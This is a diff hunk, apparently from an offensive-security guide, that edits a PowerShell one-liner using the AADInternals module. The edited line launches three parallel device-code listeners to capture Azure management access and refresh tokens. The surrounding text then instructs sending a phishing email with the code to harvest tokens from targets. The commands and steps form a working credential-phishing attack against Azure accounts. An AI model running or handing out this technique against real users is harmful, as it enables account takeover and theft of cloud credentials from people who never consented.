@@ -197,7 +197,8 @@ Install PowerShell 7 to be able to use the `-Parallel` flag:
 
 Launch 3 privileged tokens listener (in a PowerShell 7 prompt):
 ```powershell
-1..3 | ForEach-Object -Parallel { Import-Module .\AADInternals -Force; Get-AADIntAccessTokenForAzureCoreManagement -IncludeRefreshToken -UseDeviceCode }
+## See Get-AccessTokenForAzureCoreManagement
+1..3 | ForEach-Object -Parallel { Import-Module .\AADInternals -Force; Get-AADIntAccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -UseDeviceCode $true -IncludeRefreshToken $true }
 ```
 
 Then send a phishing email to the target with the given code. You'll receive the access and refresh tokens as soon as any target gives you access. The command returns when you get the token from all the targets or when the timer exceeds.
